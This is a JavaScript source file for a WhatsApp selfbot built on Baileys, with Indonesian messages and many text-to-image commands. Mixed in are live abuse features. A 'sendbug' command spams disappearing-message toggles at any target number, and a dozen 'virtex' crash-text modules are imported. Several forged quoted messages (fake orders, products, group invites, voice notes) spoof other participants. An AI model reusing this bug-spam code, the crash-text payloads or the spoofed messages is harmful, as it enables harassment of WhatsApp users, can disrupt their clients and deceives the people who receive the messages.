const { WAConnection, MessageType, Presence, MessageOptions, Mimetype, WALocationMessage, WA_MESSAGE_STUB_TYPES, ReconnectMode, ProxyAgent, GroupSettingChange, ChatModification, waChatKey, WA_DEFAULT_EPHEMERAL, mentionedJid, processTime, ECONNABORTED, WA_DEAFULT_EPHEMERAL, DataView, TypedArray, device, Browser } = require('@adiwajshing/baileys') 
const { color, bgcolor } = require('./lib/color')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { fetchJson, fetchText } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot.js");
const yts = require('yt-search')
const imgbb = require('imgbb-uploader')
const request = require('request')
const fs = require('fs')
const moment = require('moment-timezone')
const { exec } = require('child_process')
const fetch = require('node-fetch')
const axios = require("axios")
const { pinterest } = require('./src/pinterest')
const { mediafireDl } = require('./src/mediafire')
const ffmpeg = require('fluent-ffmpeg')
const { smsg } = require('./src/simple')
const { removeBackgroundFromImageFile } = require('remove.bg')
const lolis = require('lolis.life')
const loli = new lolis()
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const setting = JSON.parse(fs.readFileSync('./src/settings.json')) 
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const { help } = require('./menu/help')
const { emoji1 } = require('./virtex/emoji1')
const { emoji2 } = require('./virtex/emoji2')
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5') 
const { virtex6 } = require('./virtex/virtex6') 
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { virtexbytsukasa } = require('./virtex/virtexbytsukasa')  
const { ngazap } = require('./virtex/ngazap')  
const { virtag } = require('./virtex/virtag')
const Exif = require("./src/exif");
const exif = new Exif();
owner = setting.owner
apikey = setting.apikey
xchillds = setting.xchillds
zeks = setting.zeks
fake = 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'
gh = "https://github.com/TsukasaChanKawaiii"
shp = '⬡'
monoscape= '賢司'
image = fs.readFileSync(`./media/image.jpeg`)
thumbnail = fs.readFileSync(`./media/thumbnail.jpeg`)
gif = fs.readFileSync(`./media/gif.gif`)
virgam = fs.readFileSync(`./media/virgam.jpeg`)
let multi = true
let nopref = false
let single = false
let prefa = 'X'
blocked = []
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
}
async function starts() {
	const tsukasa = new WAConnection()
	tsukasa.version = [2, 2143, 3]
	tsukasa.logger.level = 'warn'
	console.log(banner.string)
	tsukasa.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code above'))
	})

	fs.existsSync('./src/tsukasa.json') && tsukasa.loadAuthInfo('./src/tsukasa.json')
	tsukasa.on('connecting', () => {
		start('2', 'Jancok sinyal ngelag mulu...')
	})
	tsukasa.on('open', () => {
		success('2', 'Asekk sinyal bagus nihh :v')
	})
	await tsukasa.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./src/tsukasa.json', JSON.stringify(tsukasa.base64EncodedAuthInfo(), null, '\t')) 

	tsukasa.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await tsukasa.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await tsukasa.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Halo @${num.split('@')[0]}\nSelamat datang di group *${mdata.subject}*`
				let buff = await getBuffer(ppimg)
				tsukasa.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await tsukasa.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Sayonara @${num.split('@')[0]}\n \nDia kenapa tuh kok sampe left??\nKena mental kah?\nWaduh mana masih muda dah kena mental ga tuh :v`
				let buff = await getBuffer(ppimg)
				tsukasa.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
	tsukasa.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
	tsukasa.on('chat-update', async (mek) => {
		try {
            if (!mek.hasNewMessage) return
            mek = mek.messages.all()[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (!mek.key.fromMe) return
			mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
			m = smsg(tsukasa, mek)
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const speed = require('performance-now')
			const totalchat = await tsukasa.chats.all()
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')		
			const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
if(multi){
var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_*!#$,|`÷?;:%^&./\\©^]/gi) : 'Z'	  

} else {
if (nopref){
prefix = ''

} else {
if(single){
prefix = prefa
}
}
}	  			
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)			
			chats = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const arg = chats.slice(command.length + 2, chats.length)		
			mess = {
				wait: '[ WAIT ] Sedang di proses 🎐 silahkan tunggu sebentar !',
				success: 'Success 🎐',
				error: {
					stick: 'Error [❗]',
					Iv: 'Link Tidack Valid Bruh:v [❗]️'
				},
				only: {
					group: 'Perintah ini hanya bisa di gunakan dalam group!',
					ownerG: 'Perintah ini hanya bisa di gunakan oleh owner group!',
					ownerB: 'Perintah ini hanya bisa di gunakan oleh owner bot!',
					admin: 'Perintah ini hanya bisa di gunakan oleh admin group!',
					Badmin: 'Perintah ini hanya bisa di gunakan ketika bot menjadi admin!'
				}
			}
			const botNumber = tsukasa.user.jid
			const owner = [`${setting.owner}@s.whatsapp.net`] 
			const isGroup = from.endsWith('@g.us')
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await tsukasa.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const q = args.join(' ')
			const pushname = mek.key.fromMe ? tsukasa.user.name : conts.notify || conts.vname || conts.name || '-'
			const isSimi = isGroup ? samih.includes(from) : false
			const isOwner = owner.includes(sender)
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const { 
  y2mateA,
  y2mateV
} = require('./src/y2mate.js')
			const sendFileFromUrl = async(link, type, options) => {
  hasil = await getBuffer(link)
	tsukasa.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	tsukasa.sendMessage(from, hasil, type, options).catch(e => {
	tsukasa.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	  console.log(e)
	})
	})
	})
	})
	}
	const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        tsukasa.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
			const reply = (teks) => {
				tsukasa.sendMessage(from, teks, text, {quoted:mek})
			}
const flokasi = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    locationMessage: {
                    name: fake,
                    jpegThumbnail: thumbnail
                          }
                        }
                      }
                      const fdocs = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: fake, 
                    jpegThumbnail: thumbnail
                          }
                        }
                      }
			const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": thumbnail
					},
					"title": fake,
					"description": "Uwu",
					"currencyCode": "USD",
					"priceAmount1000": "482007",
					"retailerId": fake,
					"productImageCount": 1
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
const ftroli =  {
  "key": {
    "fromMe": false,
"participant":"0@s.whatsapp.net",
    "remoteJid": "0@s.whatsapp.net"
  },
  "message": {
   orderMessage: {
itemCount: 10,
 status: 200,
 thumbnail: image, 
surface: 200, 
message: `${fake}\n> : ${command}`, 
orderTitle: 'Hmm', 
sellerJid: '0@s.whatsapp.net'}
  }
}
const fvideo = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6285709664923-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title":"@oreki.houtarou.v",
                 "h": `Hmm`,
                 'seconds': '359996400', 
                 'caption': 'Halo bang',
                 'jpegThumbnail': fs.readFileSync('./media/thumbnail.jpeg')
                        }
                       }
	                  }
const fgclink = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6285709664923-1616169743@g.us",
			"inviteCode": "mememteeeekkeke",
			"groupName": "© Xenji />", 
            "caption": "@oreki.houtarou.v", 
            'jpegThumbnail': fs.readFileSync('./media/thumbnail.jpeg')
		}
	}
}
const fgif = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6285709664923-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title":"© Xenji />",
                 "h": `Hmm`,
                 'seconds': '99999', 
                 'gifPlayback': 'true', 
                 'caption': '@oreki.houtarou.v',
                 'jpegThumbnail': fs.readFileSync('./media/thumbnail.jpeg')
                        }
                       }
	                  }
const ftext = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6285709664923-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text":"© Xenji />",
                 "title": `Hmm`,
                 'jpegThumbnail': fs.readFileSync('./media/thumbnail.jpeg')
                        }
	                  } 
                     }
const fvn = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6285709664923-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "359996400",
                 "ptt": "true"
                        }
	                  }
                     }
			const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
tsukasa.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
		    
fs.unlinkSync(filename)
});
}
			const sendMess = (hehe, teks) => {
				tsukasa.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? tsukasa.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : tsukasa.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
             const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        tsukasa.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }			
			colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
	     	const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			let authorname = tsukasa.contacts[from] != undefined ? tsukasa.contacts[from].vname || tsukasa.contacts[from].notify : undefined	
			if (authorname != undefined) { } else { authorname = groupName }	
			
			function addMetadata(packname, author) {	
				if (!packname) packname = 'WABot'; if (!author) author = 'Bot';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./src/stickers/${name}.exif`)) return `./src/stickers/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

				let len = JSON.stringify(json).length	
				let last	
				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	
				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	
				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	

				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

				fs.writeFile(`./src/stickers/${name}.exif`, buffer, (err) => {	
					return `./src/stickers/${name}.exif`	
				})	
			}
			ngetik = false
vn = true
if (vn) {
await tsukasa.updatePresence(from, Presence.recording)
} else if (ngetik) {
await tsukasa.updatePresence(from, Presence.composing)
}
			switch(command) {
					case 'menu':
					case 'help':
					let contentd1 = fs.readFileSync('./media/image.jpeg')
					let mdia1 = await tsukasa.prepareMessageMedia(contentd1,MessageType.image, {thumbnail: fs.readFileSync('./media/thumbnail.jpeg')})
					let taip1 = 4;
					let buttons1 = [
					{buttonId: 'id1', buttonText: {displayText: 'ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'}, type: 1}
					]
					let buttonMessageh1 = {
						contentText: help(prefix,shp,monoscape),
						footerText: '© Xenji />',
						buttons: buttons1,
						headerType: 4,
						...mdia1
					}
					tsukasa.sendMessage(from, buttonMessageh1, MessageType.buttonsMessage,{contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `Hii Nama Saya ${pushname} | KLIK DI SINI UNTUK CHAT LANGSUNG KE CREATOR BOTZ`,
                "body": "",
                "previewType": "LOCATION",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./media/thumbnail.jpeg`),
                "sourceUrl": "https://wa.me/62858779776969?text=Assalamualaikum Kenji"
 }},quoted:fvn})
					break
	        case 'runtime': 
            run = process.uptime() 
            teks = `${kyun(run)}`
            reply(teks)
            break 
    		    case 'upswteks':
            if (!q) return reply('Isi teksnya!')
            tsukasa.sendMessage('status@broadcast', `${q}`, extendedText)
            reply(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimg':
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await tsukasa.downloadMediaMessage(swsw)
            tsukasa.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            tsukasa.sendMessage(from, bur, text, { quoted: mek })
            } else {
            reply('Reply gambarnya!')
            }
            break
    case 'upswvid':
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await tsukasa.downloadMediaMessage(swsw)
            tsukasa.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            tsukasa.sendMessage(from, bur, text, { quoted: mek })
            } else {
            reply('reply videonya!')
            }
            break  
      case 'maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${darknn}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
		case 'maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${darknn}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${darknn}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${darknn}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${darknn}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${darknn}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${darknn}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${darknn}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'googletxt':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
					darknn = body.slice(9)
					ll1 = darknn.split("|")[0];
					ll2 = darknn.split("|")[1];
					ll3 = darknn.split("|")[0];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan`)
					darknn = body.slice(9)
					ll1 = darknn.split("|")[0];
					ll2 = darknn.split("|")[1];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${darknn}&theme=coffee-cup&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa chan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${darknn}&theme=coffee-cup2&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} TsukasaChan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${darknn}&theme=neon&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
					case 'sendbug':
              anu = args.join(" ")
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              tsukasa.toggleDisappearingMessages(anu, 7 * 24 * 60 * 60)
              reply('_Sukses Sloerr_')
              break
			case 'glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} TsukasaChan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${darknn}&theme=glow&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} TsukasaChan`)
					darknn = body.slice(9)
					reply(mess.wait)
